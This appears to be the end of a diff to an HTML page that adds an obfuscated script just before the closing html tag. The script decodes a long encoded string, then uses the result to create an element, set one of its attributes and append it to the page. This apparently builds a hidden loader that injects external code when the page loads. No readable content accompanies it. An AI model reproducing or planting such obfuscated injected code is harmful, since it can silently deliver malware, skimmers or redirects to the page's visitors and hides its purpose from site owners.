%0BH#.%135IFN%0B%1B97EHD%06%19%3E8JDJ%187?%3EEK%10*%0C-%201%3C341GL5W%06\'//T%03%1D%04%0E%16%04%0E%01E%1F(%182E8,%1D8F%1E%1B%021F%1E%04%0F%19B8%1B%1D5UGF96J4%3ECKF90%3CD%3EC10?0J4851F90%3C4N370?V%17%0E%17H%05%1B%0B=%5CGU%07%5E%5DR%5DTY@%5E_XVTHT%1E%04%0F%19B%3C%16%035S%1D%05%0B%01%04G%0A%1E%03=%5EEQ%00WYZ%5ER_L_%1DY%5B%5D%5B/HF%1E%1B%1D%04%16%0E%09G%0A%1E%03=K%16%02%0E%16%0DJER%15S_U%5BZHR%02S_UX%5B%5BKW%0E%19%0C8WER%02S_P_%5CYO%5BYZSZCV3%1A%0D?XC10Y%0F%13%0A%04%03Q%0E%03%1E%04OMX%05%5BR%5DP%5BRMZ%15S%5DQ%5ERAP%02%14%041R4%1F%06=%5E4%22%175F%06%08%0C%0A%15%07Z@Z%22QYV_TX%5B%5CRKQ%17Q%5EY,U%5C%25F_@Z%02V%5DQ%5EQ%5BO%5D%1A%5CQ_T-CV%00%1F%04%0E%0ES%09%0C%11%08AGR%5B%5C%5E%5BZQV@QCW%0D%1B%08?X@Z%02V%5DQ_S%5EO%5D%1A%5CQ_T%5ECV%19%1B%00%1DE%03%19%0E2PI_%1DYZ%5D#%5DL_%0AZZ%5DP_QF%5E%1F%02%04%0E%08I%04%16%0B:QJ%5D%0E%5DU_%5E%5DR@Q%17TX/(RDH%1C%12%01%1E%0E%0AE%0A%1C%068C%16%01%0C%12%0AE@Z%15P%5DQ%5DSMZ%02P%5DQ_T%5BCW%09%1E%02?X1)%15260%18%0987P_P%12%16%0A81FI6J4851F90%3CBNIA6?0%5EGU%07X%5DS%5BU%5DH%5E%5CYQXHUMX%05YR%5DQXQMZ%15S%5DQ_%20AQ%0F%10%08%00%04%5E%0B%0B%1E%07MI_%0AZZ%5BR%5EUBU%10%5B%5D%20+%25F_%03%19%0E2PI_%0AZZXW%5DQBSPYUVDZ%1D%00%1C%1F%1F%0CM0%18%098Q%10%1F%0F%13%0A%04%03Q%0E%03%1E%04OMX%05_R%5DUZQEZ%15S%5DP%5DWAP%02%14%041RMX%12%5CR(X,HX%05_RZPXWAQ%3C%15%011DNS%08%1F%07%0C%0AT%18%15%17%1F%07%19%14%1D%0BH?%17%10=Z%12%03%1D%04%0E%16%04%0E%01E%25%1E%0B2E,!68C%16%10%08%15%1A%17%06J%1E)+94(&9=?V%1C%09%10%06%09%19%0B%02%0FO%0A8%3C=JD%1A%1D%00%1C%1F%1F%0CMI:1?0EKD::)9$EK0IF%18%0E%1F%03%01%19%08%00%0BH#&/=IF%1E%1A%0F%19%17%1F%0FO%02%1C08JDJ6&%180EKF%06%1F2\'BDI%1E%18%08?@C%10%04%18%0F%0C%11%01%05%03B%06,?5@C%16%10%08%15%1A%17%06JEJFI4N31LI6%3CDDC10?F:D%3E570?F:2L3A69F:4N370I6J4857F90%3C4N3709F@D%3E570?DKG4%0B%1B4JDHFN@A69F:4NI10ILJ485A6I6%3C28C10?6J4851F90%3C2L%15%0C%18%0C%0E%15%06%0A%06J(**1GL%13%18%08%16%18%13%01E!%1F%0E4EHD%16%11%0D7JDJ*%1F%1B$EKF%16=2%3CBD%1F%0B%14%01%06%1C%03%02%0CM%06%25/8BD%19%1F%04%1B%10%1A%04M%157%0A8MAA%06\'%199GLC%01%1E74IFN%03/%19:EH%12%03%1D%04%0E%16%04%0E%01E)/,2EH%14%17%0D%1E%18%10%03A%1C%14;=EKF8%06.\'BDI$6%0B%3C@CF%0D%1B%005MAA%1E%03%1C2GLC3%04)%22IFN-%3E5:EHD%3C%01!%22JDJ%08%1D%038EK%10%0D%0A%11H%09*&=Z%09%10%06%09%19%0B%02%0FO%06%09%18%3CJD%1A%1D%00%1C%1F%1F%0CMIDDC10ILJ48AAE%11%08#%20MAC%10%04%18%0F%0C%11%01%05%03B(%03%1A4@C%16%10%08%15%1A%17%06J,#%1D5GLC/%25%1B7IFN%07%1C%0C8EHD%06%19%3E8JD%1C%09%10%06%09%19%0B%02%0FO%3C?%01%3CJD%1A%1D%00%1C%1F%1F%0CMIG%3C%11%079JDHEM%0F(%03:EHFLCBF96J4%3EIA6?F@D%3E57F9F:285A6?0:D%3E576ILJ4857D%1F%0B%14%01%06%1C%03%02%0CM%206%0B9BD%19%1F%04%1B%10%1A%04MJ$**?@CD9%20%0D%252@C0J%0A7%06*@CD%1F%0B%14%01%06%1C%03%02%0CM4;%009BD%19%1F%04%1B%10%1A%04M\'%25%185MAA%0E)*7GLC%0D%09%1A%3CIFN)+%1D6EH%12%03%1D%04%0E%16%04%0E%01E%1F%3C%053EH%14%17%0D%1E%18%10%03AGM%258;4EHFO@AE9F:4DC10ILJ485A6I6%3C285A6?D:D%3E3A69F:28C1F90%3C2N3709F:283ALI6%3C285CDIEJ4%3EC16ILJ485A6I6%3C28C10?6J4851FCF:285C%10%04%18%0F%0C%11%01%05%03B%3C065@C%16%10%08%15%1A%17%06J%1A8%066GLC%0D%1988IFN-%22%148EHD$%0B%18:JD%1C%09%10%06%09%19%0B%02%0FO%16;%08%3CJ%1E%0C?4A%11%1F%07%19%14%1D%0BH%19&$5:%1C%088;0Y%10%07%1A%0B%0B%1E%04%0D%03A:%0B;;EK%16%13%0A%11%1D%18%03BE4+%10%3EBDK6,%03/?BD?E%069%0C\'BDK%10%0D%0A%11H%05%07(%3C%5C4G%1B%08%18%13%09%14:%19%1D%17%18%1C%09CCG%0B%19%0F%1B%0D%05MIJ%09%18%06%3C%05%0B%07%11%18%08%06%18CCG%0B%08%1E@AC%17%01%0C%0A%0EHR%5E%1E%00%0C%15%10%13%09%18%1CX%0A%0F%19%16%04%5C%1D%00%11%16%19%1B%13%16Q%12%14%13%09%11%15_%12%10W%09%1E%00%14%01%0B%5B%12%09ONO%19%1A%14%1CHA@%1C%01%0F%10%16%1E%3E%1A%14%1D%1BG5Q%0B%17%03%02%1B%0C%07%04M3%06,%3EMA%11%1F%07%19%14%1D%0BHBFI6J4851F90%3CDMCA6I6%3C2%3EC10?DHDM1=%063EHF%18%0E%1F%03%01%19%08%00%0BH%01%0A&%3CIF%1E#%09%25*60%0C%1C\'BD?P,5%17\'BD9%3C(,=@C0Y%20;%1D*@C6%05+%18;MAA4175GL5W&%01%25)4%0E1%0D4JD%3CT%18%0E%1F%03%01%19%08%00%0BH\'%05%25%3CIF%1E%1A%0F%19%17%1F%0FOM%0B98:EHF%3E=&%3C,EH2MA%17%0B%17%03%02%1B%0C%07%04M%05%09%19%3EMA%11%1F%07%19%14%1D%0BHB(659GLA18.%3C/GL5BD%1F%0B%14%01%06%1C%03%02%0CM(%0A$9BD%19%1F%04%1B%10%1A%04M%01%000%20MAA%0E%1394GLC/%17%11#IFN!)%14,EHD,%1D%09;JDJ%00%13%090EK%10%07%1A%0B%0B%1E%04%0D%03A%04%20*$E/+$!L%13%18%08%16%18%13%01E%1B!+:6,)%20&7V%1F%0B%14%01%06%1C%03%02%0CM%06-%13&BD%19%1F%04%1B%10%1A%04M%01%000%20MAA%0E%1394GLC/%17%11#IFN!)%14,EHD,%1D%09;JDJ%00%13%090EKF%20%0C%17?BDI8%0F%3C4@CF%01%1C5:MAA$5%098GLC%05%1B%037IFN%07%04%205EHD%0A%1E%0B7JDJ6%0C#%25EKF%06%17%0E:BDI()%16?@CF;%22.7MAA%0E%1394GL%15%0C%18%0C%0E%15%06%0A%06J$!%14/GL%13%18%08%16%18%13%01E@%09%0C%10%3CIFL3\'%01(:IF8@3%00,8IFL%15%01%0A&%3CIF%5E%0E%1F%03%01%19%08%00%0BH%09%14%12#IF%1E%1A%0F%19%17%1F%0FOMCB6I6:NN37FCF:28C1F90%3C28C10K6J4%3EC16I6%3C2N3A6?0%3CD%3E576I6%3C2%3ECKF90%3C28AAEJ8%0B\'0@CDHE,=3%3EBDKD%1C%09%10%06%09%19%0B%02%0FO%20%12%19#JD%1A%1D%00%1C%1F%1F%0CMI%1B%1C%18%0F%02%04M@48A1F90%3C%12%03%1D%04%0E%16%04%0E%01E1%1F%07,EH%14%17%0D%1E%18%10%03AG%16%199:JDH40$;#JD%3CGL%15%0C%18%0C%0E%15%06%0A%06J,%15%00/GL%13%18%08%16%18%13%01E%07%22%25,EHD%20%12%19#JDJ6%0C#%25EKF%06%17%0E:BDI%02%17%0E?@CF%0D%03,8MAA$%17%0E7GLC3%22-5IFN!=%09;EHD%20%20%137JDJ*102EKF%0A%22-2BDI%0E%10;0@CF+:%056MAA%3C#%027GLC%09%1C68IFN%0F%12%060EHD%06%19%3E8JDJ%08%1D%038EK%10%07%1A%0B%0B%1E%04%0D%03A.42$EK%16%13%0A%11%1D%18%03B%0E%10;0@CF%09(%157MAA%06%1188GLC%19%14%057IF%18%0E%1F%03%01%19%08%00%0BH%09%3E%01%22IF%1E%1A%0F%19%17%1F%0FO,?%0E4JDJ6%0C#%25EKF%02%024\'BD%1F%0B%14%01%06%1C%03%02%0CM%16!1&BD%19%1F%04%1B%10%1A%04MJE8%16%08%3CBDKGI%1C%0C-?EKDHDMC16I6:NN37FCF:28C1F90%3C2N3709F:283ALI6%3C28A%17%0B%17%03%02%1B%0C%07%04M;%226!MA%11%1F%07%19%14%1D%0BH%09%1C68IFN!=%09;EHD%0A%1E%0B7JDJ%08%1D%038EKF(%1A%06%3EBDI%0E%10;0@CF#8%02:MA%17%3C7%0F6GLS%0C%18%0C%0E%15%06%0A%06J%1E)#/GL%13%18%08%16%18%13%01E-%10%1E,EHD,%1D%09;JDJ&2%0C3EKF0.%0A%3EBD%1F%0B%14%01%06%1C%03%02%0CM4#4&BD%19%1F%04%1B%10%1A%04M%0D%1B%005MAA4%0B&.GLC/)%149IFN=%3E:8EHD0%3C=7JDJ%0C%14%3C?EKF%06%17%0E:BDI%06$%1B=@CF\'%25%185MAA,7%0E4GLC%09%1C68IF%18%0E%1F%03%01%19%08%00%0BH%05%25*#IF%1E%1A%0F%19%17%1F%0FOM376;%226!MA7EKF:2L33:%01%0C%03GL5%17%0B%17%03%02%1B%0C%07%04M3$*!MA%11%1F%07%19%14%1D%0BH+4%04%0C%03GLC%0D%09%1A%3CIFN%1B%1B%3E5EHD$%0B%18:JD%1C%09%10%06%09%19%0B%02%0FO4%0B%13%22JD%1A%1D%00%1C%1F%1F%0CM%12%0E%14;BDI%0E*(3@C%10%04%18%0F%0C%11%01%05%03B%1E%04-*@C%16%10%08%15%1A%17%06JEI6:D%3E3A6?0J4N370?F:283A6?0:D%3E570KFIG00%02:JDHEM%1B%03(7EHFL%15%0C%18%0C%0E%15%06%0A%06J%208%1F.GL%13%1C%0C%10M%0E%0D%13\'WESTWX%5DXO%5D%0D_Q_U%5D%5DDY%1A%09%06%09%0DB%02%00%1B.SMX%05_S%5DP_UE%5CTT%5BUFL%1B%1D%04%16%0E%09G%0A%0A%1C%22K%16%02%0E%16%0DJER%02P_UX%5B%5CSHQ%17TXZ%5CRD%5B%00%07%1E%25PJ%5D%0E%5DUX_%5DR@Q%17TX%5B_RDZ%14%06%07%04%1E%16M(8%09\'W%0E%25)1R#%1D%04%0E%16%04%0E%01M%25(%190E%028%03=BDN%3C%0A%224@CA%09%201?MAF%1A,9/GLACEKV,%17%0C%3EBDY%01%04%1BE%033%02-P(8%09\'1$%07,0GLC+%1E%00?IF8S%1C%0C%10M$;%03\'WEP%5BS%5CTQO%5D%0D_Q_U%5C%5EDY%1A%09%06%09%0DB(6%0B.SMX%12%5CRXQ_HX%05_R_R%5BUAC%1E%15%04%15%0C%0D@/9%04%22H%14%06%09%19%08BEQ%17TXXZT@Q%00WX%5B%5CWXHU%20%3C%0C%22_EQ%17TX%5CYR@Q%00WXY%5DV%5DHT%1E%0B-)26%06-%13&BD?P(8%09\'1%0A$%145GLC3%3E89IF8S#:%0E%22:.%12%05$EK0%5C:)!2V%1F%0F%13%0A%04%03Q%0E%03%1E%04OMX%05YR%5DPZRMZ%15S%5DQ%5D%5DAP(6%0B.RD%033%02-RI_%0AZZ%5DP%5BUBU%10%5B%5DR,#F_@Z%15S%5D%22WUEZ%02P%5DW%5EQXCV%00%1F%04%0E%0ES%17%10%00%1F%04%0E%0ES%09%0C%11%08AGU%07%5B%5DR%5DSXVMZ%15S%5DQ%5DRAP%02%00%1B.RD%0B-)2RI_%0AZZ%5CR%5EUBU%10%5B%5DP%5CRF_@Z%02P%5CQ%5EUXG%5D%1A%5CP_WXCV%00%1F%04%0E%0ES%17%1F%07%19%14%1D%0BH%09*&=Z%12%03%1D%04%0E%16%04%0E%01E%0F%3C%04-EH%14%17%0D%1E%18%10%03AG0%02%228JDHDM%0B%0F%185EHF%18%0E%1F%03%01%19%08%00%0BH%0D%1D5%22IF%1E%1A%0F%19%17%1F%0FOM1=%0E%03%0FIFLC10%1F,0==@CV%04%18%0F%0C%11%01%05%03B$%105*@C%16%10%08%15%1A%17%06J(659GLC%09%1C68IFN%25$&8EHD,?%0E4JDJ6*\'2EKF%0E%19%042BDI%0E*(3@C%10%04%18%0F%0C%11%01%05%03B%0E%0C%3E*@C%16%10%08%15%1A%17%06JE%01%08%148MAC6/%01+8MA7E;:%0A%3EMAC%10%04%18%0F%0C%11%01%05%03B(%0F;*@C%16%10%08%15%1A%17%06JE75%098MACFJ4%04%156@CD%1F%0B%14%01%06%1C%03%02%0CM8%06.\'BD%19%1F%04%1B%10%1A%04MJ%19%18%1F%00%07%0CMC6%3CF%3ECKF90%3C%12.%0B%22%25L(;#,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MPU%1CT.%0B%22%25L%0A%19%20,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MSZ%1CT.%0B%22%25L,4(,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MS%5C%1CT.%0B%22%25L%0E%12%25,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MP%5D%1CT.%0B%22%25L%1A1-,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MQX%1CT.%0B%22%25L4%0C*,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MQ%5B%1CT.%0B%22%25L,6%0B/U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MS%5B%1CT.%0B%22%25L8%0BY,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04MQ%5C%1CT.%0B%22%25L%1A3W,U%0C%18%0C%0E%15%06%0A%06BD%19%1F%04%1B%10%1A%04M%5B%10Z$%06%20%22C3%08P&X%0E%1F%03%01%19%08%00%0B@C%16%10%08%15%1A%17%06J%5EP%10Z$%06%20%22C%11%20R&X%0E%1F%03%01%19%08%00%0B@C%16%10%08%15%1A%17%06J%5EQ%10Z$%06%20%22C%0D%258&X%0E%1F%03%01%19%08%00%0B@C%16%10%08%15%1A%17%06J%5EV%10Z$%06%20%22C%0D\'%17%25X%0E%1F%03%01%19%08%00%0B@C%16%10%08%15%1A%17%06JU%1FV*%0C-%20D%3C%05%14+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BH%5B%5D%1FV*%0C-%20D%06\'%1C+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BHYU%1FV*%0C-%20D%20%00%19+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BHYT%1FV*%0C-%20D%0A%18%01+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BH%5E%5D%1FV*%0C-%20D%0E%17%0A+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BHXT%1FV*%0C-%20D(S%04+R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BH%5BU%1FV*%0C-%20D%0A%10%09)R%03%1D%04%0E%16%04%0E%01MA%11%1F%07%19%14%1D%0BH%5D%10Y&%02\'-F#4%04%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EZ%5D%10Y&%02\'-F3%0AQ*%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EZY%10Y&%02\'-F+%22W*%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01E%5BZ%10Y&%02\'-F%1D\'R*%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EY_%10Y&%02\'-F%1D!%1A%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EY%5E%10Y&%02\'-F3%04#%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EZX%10Y&%02\'-F%19*%11%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01E%5B%5D%10Y&%02\'-F%05/%0C%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EZ_%10Y&%02\'-F;U%12%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EZ%5E%10Y&%02\'-F%19$8%25%5C%09%10%06%09%19%0B%02%0FGL%13%18%08%16%18%13%01EYY%10%1FD\")")}();var AkNO=document[KcHH.esrF(0)](KcHH.anmF(1));AkNO[KcHH.uC6C(2)](KcHH.S43C(3),KcHH.qzyD(4));document[KcHH.ahLD(5)][KcHH.yLfE(6)](AkNO)
+  </script>
+
 </html>
